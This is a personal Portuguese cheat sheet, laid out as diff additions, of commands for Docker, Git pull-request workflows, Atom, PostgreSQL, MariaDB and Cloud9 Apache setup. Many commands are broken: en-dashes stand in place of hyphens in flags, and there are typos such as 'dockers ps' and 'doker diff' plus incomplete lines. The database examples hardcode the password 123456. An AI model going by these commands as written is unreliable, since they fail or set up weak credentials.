+echo "deb https://apt.dockerproject.org/repo ubuntu-trusty main" | sudo tee /etc/apt/sources.list.d/docker.list
+
+
+sudo apt-get update
+sudo apt-get install docker-engine
+
+
+#para poder utilizar o docker sem o sudo
+sudo gpasswd -a ${USER} docker
+sudo service docker restart
+
+
+#iniciar reiniciar e parar o docker
+service docker start|restart|stop
+
+
+#Iniciar o docker on boot
+sudo systemctl enable 
+
+
+#verificar a versão
+docker version
+
+
+#obter containers a correr com sucesso
+dockers ps
+
+
+#obter containers a correr com sucesso e terminados com erro
+dockers ps
+
+
+#verificar as imagens guardadas
+docker images 
+
+
+#eliminar uma imagem
+docker rmi ubuntu:latest
+
+
+#forçar o eliminar uma imagem (caso existam ainda conatiners)
+docker rmi –f ubuntu:latest
+
+
+#correr um container 
+docker run hello-world
+
+
+#Correr um container com porta de rede e manter continuamente a correr
+docker run –d -P training/webapp python app.py
+
+
+#Correr um container numa porta de rede específica
+docker run –d –p 5000:5000 training/webapp python app.py
+
+
+#Correr um container numa porta de rede específica e numa interface de rede especícfica
+docker run –d –p 127.0.0.1:5000:5000 training/webapp python app.py
+
+
+#correr um container indicando um nome específico
+docker run –d –P –name web training/webapp python app.py
+
+
+#correr um cpntainer com uma ligação a um outro
+docker run –d –P –name web –link db:db training/webapp python app.y
+
+
+#correr container de forma a aceder à linha de comando e aos ficheiros
+docker run –t –i training/webapp /bin/bash
+
+
+#correr container com volume de dados interno
+docker run –d –P --name web –v /webapp training/webapp python app.py
+
+
+#correr container com volume mapeado com directório na máquina mãe
+docker run –d –P –name web –v /src/webapp:/opt/webapp training/webapp python app.py 
+
+
+#criar um container do tipo volume de dados de forma a ser partilhado por outros containers
+docker create –v /dbdata –name dbdata training/postgres /bin/true
+
+
+#correr um container que inclui um volume de dados anteriormente criado
+docker run –d –volumes-from dbdata –name db2 training/postgres
+
+
+#correr um container para fazer backup de um determinado volume de dados
+docker run –volumes-from dbdata –v $(pwd):/backup Ubuntu tar cvf /backup/backup.tar /dbdata
+
+
+#correr  um container para fazer restore de um determinado volume de dados
+Docker run –volumes-from dbdata2 –v $(pwd):/backup busybox tar xvf /backup/backup.tar
+
+
+#verificar em que porta está a correr um container
+docker port d4db123
+
+
+#verificar o nome de um container através do seu id
+docker inspect –f “{{ .Name }}” 7b827
+
+
+#verificar os links associados a um container
+docker inspect –f “{{ .HostConfig.Links }}” web
+
+
+#obter informações de um container a correr
+docker inspect 7b827
+
+
+#parar um container 
+docker stop 7b827
+
+
+#iniciar um container 
+docker start 7b827
+
+
+#eliminar um container 
+docker rm 7b827
+
+
+#eliminar um container que contenha volumes de dados
+docker rm –v 7b827
+
+
+#parar e ao mesmo tempo eliminar um container
+docker rm –f web
+
+
+#fazer login no docker hub
+docker login
+
+
+#procurar docker imagens no docker hub
+docker search laravel
+
+
+#obter image do doker hub
+docker pull eboraas/laravel
+
+
+#criação de uma nova imagem baseada noutra alterada
+docker commit –m “Alteração” –a “Miguel Gouveia” \7b827 miguelbgouveia/laravel:v2login
+
+
+#enviar uma imagem para o docker hub
+docker push miguelbgouveia/laravel:v2
+
+
+#obter as diferenças entre um container e a sua imagem de origem
+doker diff laravel
+
+
+#explorar um container que esteja a correr e para poder fazer alterações
+docker exec –it laravel bash
+
+
+#fazer bk de uma image
+docker save -o <save image to path> <image name>
+docker save -o /home/miguelbgouveia/postgresql-ckan.tar f62
+
+
+#fazer restore de uma image para o docker
+docker load -i <path to image tar file>
+
+
+#Para atribuir ou alterar o nome de uma imagem
+docker tag server:latest myname/server:latest
+ou
+docker tag d583c3ac45fd myname/server:latest
+
+
+#Ler o log de errors de uma imagem
+docker logs <image name or image id> 
+
+
+#Instalar e correr a imagem oficial de mariaDB com volume de dados no host. O volume no #host deverá ter o owner 999:docker.
+docker run --name mariadb -e MYSQL_ROOT_PASSWORD=123456 -e MYSQL_USER=joomla -e MYSQL_PASSWORD=123456 -e MYSQL_DATABASE=joomla –v /home/miguelbgouveia/Documents/projects/databases/:/var/lib/mysql -d mariadb
+
+
+#Instalar phpmyadmin ligado à imagem de mariadb
+docker run -d --link mariadb:mysql -p 8080:80 --name phpmyadmin nazarpc/phpmyadmin
+
+
+#instalar e correr a imagem official do joomla com o código no host. O volume no host deverá ter o owner www-data:www-data.
+docker run –name joomla –link mariadb:mysql –p 80:80 –e JOOMLA_DB_USER=joomla –e JOOMLA_DB_PASSWORD=123456 –v /home/miguelbgouveia/Documents/projects/joomla/:/var/www/html –d joomla 
+
+
+#instalar e correr a imagem official do joomla com o código no host e com ficheiro php.ini para alteração de variáveis de configuração do php
+docker run --name joomla  --link mariadb:mysql -p 80:80 -e JOOMLA_DB_USER=joomla -e JOOMLA_DB_PASSWORD=123456 -v /home/miguelbgouveia/Documents/projects/joomla/:/var/www/html -v /home/miguelbgouveia/Documents/projects/php_joomla/php.ini:/usr/local/etc/php/php.ini  -d joomla
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+-------------------------------------------------------------------
+---------------------- Git ----------------------------------------
+
+
+#Iniciar um repositório num diretório local
+git init
+
+
+#Adicionar todos os ficheiros e sub diretórios de um diretório
+git add .
+
+
+#Adicionar repositório remoto no bitbucket
+git remote add origin git@bitbucket.org:miguelbgouveia/joomla_com_helloworld.git
+
+
+#Criar um commit das alterações realizadas
+git commit –m ‘Initial commit’ 
+
+
+#Enviar alterações para sistema remoto
+git push –u origin master
+
+
+#Obter última versão do servidor
+git pull
+
+
+#para mudar de branche
+git checkout branch2
+
+
+#Obter os sistemas remotos configurados
+git remote -v 
+
+
+# Criar um novo branch e ligar-se a ele ao mesmo tempo
+git checkout -b my_new_branch
+
+
+# Para obter informação da situação atual do git
+git status
+
+
+# Para obter todas as versões existentes
+git reflog
+
+
+# Reverter para uma versão em concreto
+git reset HEAD{index}
+
+
+# Adicionar novas alterações ao último commit
+git commit --amend “Nova mensagem ou vazio para manter a anterior” 
+
+
+# Remover o último commit 
+git reset HEAD~ --hard
+
+
+
+
+
+
+# Para fazer commit para um pull request referente a um repositório no git hub clone de um repositório oficial
+git clone https://github.com/miguelbgouveia/joomla-cms.git 
+git checkout patch-3
+[fazer alterações necessárias localmente]
+git checkout 
+git pull https://github.com/joomla/joomla-cms.git staging
+[now git tries to sync and show the conflicted files]
+[now you need to fix the conflicts]
+git commit -am 'fix conflicts'
+git push origin 
+
+
+# Para fazer criar PR para código já existente e ligado ao repositório original
+
+
+1- Criar um fork do repositório no github
+
+
+
+
+2- Adicionar o repositório fork ao git local (atenção utilizar protocolo https)
+git remote add my_fork https://github.com/miguelbgouveia/ckanext-googleanalytics.git
+3- Adicionar um novo branch localmente. O nome do branche deverá conter o número do issue associado e palavras que descrevem a alteração:
+git checkout -b 20-remove-genshi-reference
+4- Proceder às alteraçõe no código localmente
+5- Adicionar os ficheiros a serem considerados para commit (stage to commit)
+git add path/to/file.txt
+
+
+6- Criar um commit localmente com as alterações realizadas
+git commit -m "As minhas alterações"
+
+
+7- Enviar commit para repositório fork e branch criado
+git push my_fork 20-remove-genshi-reference
+
+
+8- Ir para o site do GitHub e na informação sobre a criação de um novo branch clicar no link “create new PR”.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-------------------------------------------------------------------
+---------------------- Atom ----------------------------------------
+-------------------------------------------------------------------
+
+
+#instalar
+sudo add-apt-repository ppa:webupd8team/atom
+sudo apt-get update
+sudo apt-get install atom 
+
+
+-------------------------------------------------------------------
+
+
+--------------------------------------------------------------------------
+----------- Postgresql -----------------------------------------------
+--------------------------------------------------------------------------
+
+
+# Configuração por omissão
+port = 5432
+configuration file = /etc/postgresql/9.4/main/postgresql.conf
+data directory = /var/lib/postgresql/9.4/main/base
+
+
+# Para obter a localização dos ficheiros principais
+ps auxw|grep postgres|grep -- -D
+
+
+# Listar todas as bases de dados
+sudo –u postgres psql –l
+
+
+#No caso de pedir a passw de utilizador e não sabermos correr comando psql no diretório raís
+which psql #para obter path de psql
+/usr/bin/psql -l #para obter lista de base de dados
+
+
+# para listar as bases de dados na linha de comandos do postgres
+\l
+
+
+# Para iniciar linha de comandos do postgres. Caso não reconheça o comando posicionar-se no diretorio /etc/postgresql/9.X/main e apenas digitar psql
+sudo –u postgres psql
+
+
+# Para sair da linha de comandos do postgres
+\q
+
+
+# Criar novo utilizador com nome new_user
+sudo -u postgres createuser -S -D -R -P -l new_user
+
+
+# Criar nova base de dados de nome new_database em que o owner é o new_user
+sudo -u postgres createdb -O new_user new_database -E utf-8
+
+
+# Para iniciar e parar o serviço
+Sudo service postgresql start/stop
+
+
+# Para definir acesso remoto para a BD 
+- editar o ficheiro /etc/postgres/9.4/main/postgresql.conf e edita a seguinte variável:
+listen_addresses = ´*´
+- depois editar o ficheiro e /etc/postgres/9.4/main/pg_hba.conf e adicionar a seguinte linha
+host    all    all    [Ip da máquina cliente]/32    md5
+- reiniciar o serviço para obter o acesso.
+
+
+--------------------------------------------------------------------------
+--------------------------------------------------------------------------
+
+
+--------------------------------------------------------------------------
+----------- MariaDB --------------------------------------------------
+--------------------------------------------------------------------------
+
+
+# Iniciar parar e verificar estado:
+service mysql start|restart|stop|status
+
+
+--------------------------------------------------------------------------
+--------------------------------------------------------------------------
+
+
+--------------------------------------------------------------------------
+----------- Cloud 9 --------------------------------------------------
+--------------------------------------------------------------------------
+
+
+# criar aplicação alternativa noutra porta:
+
+
+1- Criar novo ficheiro de configuração:
+
+
+sudo -i
+cd /etc/apache2/sites-available
+cp 001-cloud9.conf 002-myconfig.conf
+2- Criar link para sites ativos:
+
+
+cd /etc/apache2/sites-enabled
+ln -s /etc/apache2/sites-available/002-myconfig.conf
+3- Definir a porta para a aplicação editando o ficheiro 002-myconfig.conf e mudando a porta de 8080 para 8081 ou 8082. Alterar o parâmetro DocumentRoot de forma a apontar para o diretório da aplicação.
+4- Definir escutas à nova porta no apache editando o ficheiro /etc/apache2/ports.conf e adicionado a linha: Listen 8081.
+
+
+
+
